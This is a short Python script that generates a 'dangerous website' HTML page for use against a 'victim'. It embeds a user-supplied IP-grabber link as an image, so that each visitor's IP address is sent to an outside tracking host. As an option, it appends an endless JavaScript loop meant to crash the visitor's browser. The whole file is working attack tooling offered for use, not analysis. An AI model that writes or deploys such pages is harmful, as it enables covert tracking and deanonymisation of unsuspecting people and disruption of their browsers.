import random
import string
import colorama
from colorama import Fore

colorama.init(autoreset=True)

print(Fore.LIGHTGREEN_EX + "Compile your dangerous website")

ip_grabber = input("past the link of your ip grabber (http://canarytokens.org/generate): ")
browser_crasher = input("Do you want to make the browser of the victim crash ? (y/n): ")

index = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dangerous website</title>
</head>
<body>
    <img src="{ip_grabber}">
</body>
</html>
    """
crasher_browser = """
<script>
    var random = Math.random();
    while (random) {
        console.log(random)
    }
</script>
"""

if browser_crasher == "y":
    print(Fore.LIGHTBLUE_EX + "Compiling...")

    file_name = "" + "".join(random.choices(string.ascii_letters + string.digits, k=20))



    with open(f"compliled/{file_name}.html", "a") as file:
        file.write(index + "\n" + crasher_browser)

    print(Fore.LIGHTGREEN_EX + "Website compiled !")
    input("")


if browser_crasher == "n":
        print(Fore.LIGHTBLUE_EX + "Compiling...")

        file_name = "" + "".join(random.choices(string.ascii_letters + string.digits, k=20))



        with open(f"compliled/{file_name}.html", "a") as file:
            file.write(index)
    
        print(Fore.LIGHTGREEN_EX + "Website compiled !")
        input("")